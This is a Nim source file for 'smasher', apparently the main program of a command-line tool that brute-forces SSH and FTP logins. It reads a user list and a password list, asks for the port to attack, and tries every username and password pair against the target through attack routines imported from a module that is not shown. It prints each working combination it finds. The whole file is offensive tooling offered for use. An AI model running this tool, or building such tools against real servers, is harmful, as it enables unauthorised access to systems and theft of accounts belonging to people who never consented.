import asyncdispatch,  asyncfutures, std/parseopt, strutils, std/private/ospaths2, asyncfile, asyncstreams, os
import "./methods/force_types.nim"





proc read_text_file(file_path: string): seq[string] =
    var file_name = file_path
    var password_list: seq[string]= @[]
    for line in open(file_name).lines:
        password_list.add(line)
    return password_list


proc main() {.async.} =
    var
        url: string = ""
        passwordList: string = ""
        userlist: string = ""
        port: Port
        useSSH = false
        useFTP = false
    var p = initOptParser("", shortNoVal={'s', 'f'})
    while true:
        p.next()
        case p.kind
        of cmdEnd: break
        of cmdArgument: echo p.key
        of cmdShortOption, cmdLongOption:
            if p.key == "s":
                echo "SSH Bruteforcing"
                echo "Please enter the chosen port for attack: "
                var input = readLine(stdin)
                if input.len > 0:
                    try:
                        let parsedPort = parseInt(input)
                        if parsedPort >= 1 and parsedPort <= 65535:
                            if parsedPort != 21:
                                port = Port(parsedPort)
                                useSSH = true
                            else:
                                echo "That port is dedicated to FTP servers. Type again:"
                                let newParsedPort = parseInt(readLine(stdin))
                                if newParsedPort >= 1 and newParsedPort <= 65535:
                                    port = Port(newParsedPort)
                                    useSSH = true
                                else:
                                    echo "Please try again"
                                    quit(1)
                    except ValueError:
                        echo "Could not parse given port: ValueError"
                        quit(1)
                else:
                    echo "Defaulting to port 22"
                    port = Port(22)
                    useSSH = true
            elif p.key == "f":
                echo "FTP Bruteforcing"
                echo "Please enter the chosen port for attack: "
                var input = readLine(stdin)
                if input.len > 0:
                    try:
                        let parsedPort = parseInt(input)
                        if parsedPort >= 1 and parsedPort <= 65535:
                            port = Port(parsedPort)
                            useFTP = true
                    except ValueError:
                        echo "Could not parse given port: ValueError"
                        quit(1)
                else:
                    echo "Defaulting to port 21"
                    port = Port(21)
                    useFTP = true
            elif p.key == "passlist":
                if p.val != "":
                    passwordList = p.val
                else: 
                    echo "Please provide a wordlist"
                    quit(1)
            elif p.key == "url":
                if p.val != "":
                    url = p.val
            elif p.key == "userlist":
                 if p.val != "":
                    userlist = p.val
                 else:
                    echo "Please provide an userlist"
                    quit(1)
           
        
            else:
                echo "Usage: ./smasher -s/-f --list:<wordlist> --userlist:<userlist> --url <ip or url>"
                quit(1)
      
    if useSSH == true:
        try:
            echo url

            echo "Userlist: ", userlist
            echo "Passlist: ", passwordList
            var userlist_file : seq[string] = read_text_file(userlist)
            var readPasswordList: seq[string] = read_text_file(passwordList)

            for user in userlist_file:
                for pass in readPasswordList:
                    if waitFor ssh_bruteforce(url, user, port, pass):
                        echo "Username and password combination found: ", user, pass
        except IOError:
            echo "Could not open specified file(s)"
            
     
           
        
    if useFTP == true:

        try: 
                echo "Userlist: ", joinPath(userlist)
                echo "Passlist: ", joinPath(passwordList)
                var userlist_file : seq[string] = read_text_file(userlist)
                var readPasswordList: seq[string] = read_text_file(passwordList)
                var userlist_path = "." / userlist
                echo userlist_path
                for user_line in userlist_file:
                    for pass_line in readPasswordList:
                        if waitFor ftp_bruteforce(url,user_line,pass_line, port):
                            echo "Username and password combination found: ", user_line, pass_line
        except IOError:
                echo "Could not open file(s)"
                    


waitFor main()